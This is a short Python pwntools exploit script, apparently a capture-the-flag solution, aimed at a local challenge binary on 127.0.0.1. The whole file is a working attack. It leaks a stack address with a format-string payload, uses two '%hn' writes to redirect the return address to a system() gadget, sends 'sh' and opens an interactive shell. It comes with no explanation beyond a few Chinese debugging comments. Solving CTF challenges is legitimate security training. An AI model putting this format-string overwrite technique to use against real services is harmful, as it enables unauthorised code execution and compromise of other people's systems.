from pwn import *
import ctypes    
context(arch='amd64', os='linux', log_level='debug')                        
# context.terminal = ["tmux","splitw","-h"]#产生左右分屏，不带的话是上下分屏比较难受
# gdb.attach(io)                    # 启动 GDB
io = remote("127.0.0.1",36803) 
# io = process("./pwn")        
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

system_addr = 0x40127b

fmt = "%8$p".encode()
io.sendafter(b'him...',fmt)
io.recvuntil('0x')
ret_addr = int(b'0x'+io.recv(12),16)-0x18
print(hex(ret_addr))
io.sendafter(b' battle!',b'\x00'*8)

fmt = "%{}c%12$hn".format(ret_addr & 0xffff).encode()
io.sendafter(b'him...',fmt)
io.sendafter(b' battle!',b'\x00'*8)

fmt = "%{}c%32$hn".format(system_addr & 0xffff).encode()
io.sendafter(b'him...',fmt)

io.sendafter(b' battle!','sh\x00')

io.interactive()
